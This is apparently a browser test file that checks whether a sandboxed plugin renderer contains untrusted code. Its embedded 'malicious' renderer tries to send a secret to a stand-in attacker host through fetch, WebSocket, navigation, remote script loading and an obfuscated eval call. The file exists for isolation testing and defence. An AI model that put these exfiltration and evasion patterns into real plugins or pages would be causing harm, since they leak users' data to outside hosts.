// @vitest-environment node

import * as http from 'node:http'
import * as fs from 'node:fs'
import * as os from 'node:os'
import * as path from 'node:path'
import { afterEach, beforeEach, describe, expect, it, onTestFailed } from 'vitest'
import { chromium, type Browser, type Page } from 'playwright'
import { validateHomerailA2uiSurface } from 'homerail-protocol'
import {
  buildCustomRendererSrcdoc,
  CUSTOM_RENDERER_WORKER_BOOTSTRAP,
  customRendererInitEnvelope,
  type CustomRendererIdentityV1,
} from './custom-renderer-bridge'

let browser: Browser | undefined
let server: http.Server | undefined
let page: Page
let origin: string
let phase = 'not started'
let phaseStartedAt = 0
let completedPhases: { phase: string; duration_ms: number }[] = []
let consoleMessages: string[] = []

function enterPhase(next: string): void {
  const now = performance.now()
  if (phaseStartedAt) completedPhases.push({ phase, duration_ms: Math.round(now - phaseStartedAt) })
  phase = next
  phaseStartedAt = now
}

// Browser cold startup has its own bounded fixture budget; it must not consume
// the renderer's assertion budget or outlive a timed-out test.
const browserSetupTimeout = process.platform === 'win32' ? 120_000 : 60_000
const browserLaunchTimeout = process.platform === 'win32' ? 90_000 : 50_000
const browserIsolationTimeout = process.platform === 'win32' ? 120_000 : 45_000

async function listen(): Promise<{ origin: string }> {
  server = http.createServer((_req, res) => {
    res.writeHead(200, {
      'content-type': 'text/html; charset=utf-8',
      'content-security-policy': "default-src 'self'; frame-src 'self' blob: data:; script-src 'self' 'unsafe-inline' blob:; worker-src blob:",
    })
    res.end('<!doctype html><html><body><main id="host"></main></body></html>')
  })
  await new Promise<void>(resolve => server!.listen(0, '127.0.0.1', resolve))
  const address = server.address()
  if (!address || typeof address !== 'object') throw new Error('browser harness did not bind')
  return { origin: `http://127.0.0.1:${address.port}` }
}

beforeEach(async () => {
  phase = 'not started'
  phaseStartedAt = 0
  completedPhases = []
  consoleMessages = []
  onTestFailed(() => {
    // Use only in-memory diagnostics: a stuck page must not stall reporting.
    console.error('Custom Renderer browser failure', JSON.stringify({
      phase,
      phase_elapsed_ms: Math.round(performance.now() - phaseStartedAt),
      completedPhases,
      consoleMessages,
    }))
  })
  enterPhase('listen fixture')
  origin = (await listen()).origin
  const programFiles = process.env.ProgramFiles ?? process.env.PROGRAMFILES
  const programFilesX86 = process.env['ProgramFiles(x86)'] ?? process.env['PROGRAMFILES(X86)']
  const localAppData = process.env.LocalAppData ?? process.env.LOCALAPPDATA
  const windowsBrowserPaths = process.platform === 'win32'
    ? [
        programFiles && path.join(programFiles, 'Google', 'Chrome', 'Application', 'chrome.exe'),
        programFilesX86 && path.join(programFilesX86, 'Google', 'Chrome', 'Application', 'chrome.exe'),
        localAppData && path.join(localAppData, 'Google', 'Chrome', 'Application', 'chrome.exe'),
        programFiles && path.join(programFiles, 'Microsoft', 'Edge', 'Application', 'msedge.exe'),
        programFilesX86 && path.join(programFilesX86, 'Microsoft', 'Edge', 'Application', 'msedge.exe'),
      ].filter((candidate): candidate is string => Boolean(candidate))
    : []
  const executablePath = [
    process.env.PLAYWRIGHT_CHROMIUM_EXECUTABLE_PATH,
    process.env.CHROME_BIN,
    ...windowsBrowserPaths,
    path.join(os.homedir(), '.local/bin/google-chrome'),
    '/usr/bin/google-chrome',
    '/usr/bin/chromium',
  ].find(candidate => candidate && fs.existsSync(candidate))
  enterPhase(`launch Chromium (${executablePath ?? chromium.executablePath()})`)
  browser = await chromium.launch({ headless: true, timeout: browserLaunchTimeout, ...(executablePath ? { executablePath } : {}) })
  enterPhase('create browser context')
  const browserContext = await browser.newContext()
  browserContext.setDefaultTimeout(10_000)
  browserContext.setDefaultNavigationTimeout(10_000)
  enterPhase('create page')
  page = await browserContext.newPage()
  page.on('console', message => {
    if (consoleMessages.length < 50) consoleMessages.push(`${message.type()}: ${message.text()}`)
  })
  page.on('pageerror', error => {
    if (consoleMessages.length < 50) consoleMessages.push(`pageerror: ${error.message}`)
  })
  enterPhase('navigate fixture')
  await page.goto(origin, { waitUntil: 'domcontentloaded' })
  enterPhase('fixture ready')
}, browserSetupTimeout)

afterEach(async () => {
  await browser?.close()
  browser = undefined
  if (server?.listening) await new Promise<void>(resolve => server!.close(() => resolve()))
  server = undefined
})

describe('Custom Renderer real Chromium isolation', () => {
  it('contains untrusted code and returns only native A2UI JSON without iframe DOM', async () => {
    const identity: CustomRendererIdentityV1 = {
      plugin_id: 'com.example.malicious',
      plugin_version: '1.0.0',
      renderer_id: 'malicious-card',
      renderer_digest: 'a'.repeat(64),
      node_id: 'node-malicious',
      node_revision: 1,
    }
    const nonce = 'b'.repeat(48)
    const source = `export async function render(payload) {
      const attempts = [
        () => { location.href = 'https://attacker.invalid/navigation?secret=worker-secret' },
        () => { globalThis.location = 'https://attacker.invalid/global-navigation?secret=worker-secret' },
        () => fetch('https://attacker.invalid/fetch?secret=worker-secret'),
        () => new XMLHttpRequest(),
        () => new WebSocket('wss://attacker.invalid/socket?secret=worker-secret'),
        () => new Worker('https://attacker.invalid/recursive-worker.js'),
        () => importScripts('https://attacker.invalid/classic-loader.js'),
        () => (0, eval)("globalThis['fe' + 'tch']('https://attacker.invalid/eval-fetch?secret=worker-secret')"),
        () => postMessage({ forged: true, secret: 'worker-secret' }),
        () => document.body.replaceChildren('escaped'),
      ];
      for (const attempt of attempts) {
        try { await attempt() } catch {}
      }
      return {
        version: 'v1.0',
        catalogId: 'https://homerail.dev/a2ui/catalogs/core/v1',
        components: [
          { id: 'root', component: 'HrSection', title: 'Worker result', children: ['metric', 'approve'] },
          { id: 'metric', component: 'HrMetric', label: 'Title', value: payload.node.content.title },
          { id: 'approve', component: 'Button', child: 'label', action: { event: { name: 'approve' } } },
          { id: 'label', component: 'Text', text: 'Approve safely' },
        ],
      };
    }`
    const srcdoc = buildCustomRendererSrcdoc({ source, nonce, identity, parent_origin: origin })
    const init = customRendererInitEnvelope(identity, nonce, {
      node: {
        id: identity.node_id,
        revision: identity.node_revision,
        content: { title: 'Worker-rendered safe view' },
      },
      placement: { node_id: identity.node_id },
      context: { device: 'desktop' },
    } as never)

    const leakedRequests: string[] = []
    const navigations: string[] = []
    page.on('request', request => {
      if (request.url().includes('attacker.invalid')) leakedRequests.push(request.url())
    })
    page.on('framenavigated', frame => navigations.push(frame.url()))
    enterPhase('worker bootstrap probe')

    const bootstrapProbe = await page.evaluate(({ bootstrap, probeIdentity, probeNonce }) => new Promise<string>((resolve) => {
      const url = URL.createObjectURL(new Blob([bootstrap], { type: 'text/javascript' }))
      const worker = new Worker(url, { type: 'module' })
      const finish = (value: string) => {
        worker.terminate()
        URL.revokeObjectURL(url)
        resolve(value)
      }
      worker.addEventListener('message', event => finish(String(event.data?.type || 'unknown-message')))
      worker.addEventListener('error', event => finish(`error:${event.message}`))
      worker.postMessage({
        worker_protocol: 1,
        type: 'homerail.custom-renderer.worker.configure',
        nonce: probeNonce,
        identity: probeIdentity,
        source: `export function render(payload) { return { version: 'v1.0', catalogId: 'https://homerail.dev/a2ui/catalogs/core/v1', components: [{ id: 'root', component: 'Text', text: String(payload?.node?.id || 'probe') }] } }`,
      })
      setTimeout(() => finish('timeout'), 2_000)
    }), { bootstrap: CUSTOM_RENDERER_WORKER_BOOTSTRAP, probeIdentity: identity, probeNonce: nonce })
    expect(bootstrapProbe).toBe('homerail.custom-renderer.worker.ready')

    enterPhase('mount renderer frame')
    await page.evaluate(({ frameSource, envelope }) => {
      const messages: unknown[] = []
      Object.defineProperty(window, '__customRendererMessages', { value: messages, configurable: true })
      window.addEventListener('message', event => messages.push(event.data))
      const frame = document.createElement('iframe')
      frame.id = 'custom-renderer'
      frame.setAttribute('sandbox', 'allow-scripts')
      frame.setAttribute('credentialless', '')
      frame.setAttribute('referrerpolicy', 'no-referrer')
      frame.setAttribute('allow', '')
      frame.addEventListener('load', () => frame.contentWindow?.postMessage(envelope, '*'), { once: true })
      frame.srcdoc = frameSource
      document.querySelector('#host')?.append(frame)
    }, { frameSource: srcdoc, envelope: init })

    enterPhase('wait for renderer A2UI')
    try {
      // Playwright defaults to requestAnimationFrame polling here. Hosted
      // Windows browsers may throttle rAF even though postMessage delivery
      // continues, so poll on a wall-clock interval instead.
      await page.waitForFunction(() => (window as any).__customRendererMessages
        .some((message: any) => message?.type === 'homerail.custom-renderer.a2ui'), undefined, {
        polling: 100,
        timeout: 10_000,
      })
    } catch (cause) {
      // Do not issue another potentially unbounded evaluate on a stalled page.
      throw new Error(`Renderer did not return A2UI: console=${JSON.stringify(consoleMessages)}`, { cause })
    }

    enterPhase('validate A2UI and isolation')
    const messages = await page.evaluate(() => (window as any).__customRendererMessages)
    expect(messages.map((message: any) => message?.type)).toEqual([
      'homerail.custom-renderer.ready',
      'homerail.custom-renderer.a2ui',
    ])
    const a2uiMessage = messages.find((message: any) => message?.type === 'homerail.custom-renderer.a2ui')
    expect(validateHomerailA2uiSurface(a2uiMessage.a2ui, {
      action_ids: new Set(['approve']),
      data_model: { title: 'Worker-rendered safe view' },
    }).valid).toBe(true)
    expect(a2uiMessage.a2ui.components.some((component: any) => component.component === 'HrMetric')).toBe(true)

    const renderer = page.locator('#custom-renderer').contentFrame()
    expect(await renderer.locator('button').count()).toBe(0)
    expect(await renderer.locator('img,video,audio,iframe,form').count()).toBe(0)
    expect(page.url()).toBe(`${origin}/`)
    expect(page.frames().some(frame => frame.url().includes('attacker.invalid'))).toBe(false)
    expect(navigations.some(url => url.includes('attacker.invalid'))).toBe(false)
    expect(leakedRequests).toEqual([])
  }, browserIsolationTimeout)
})
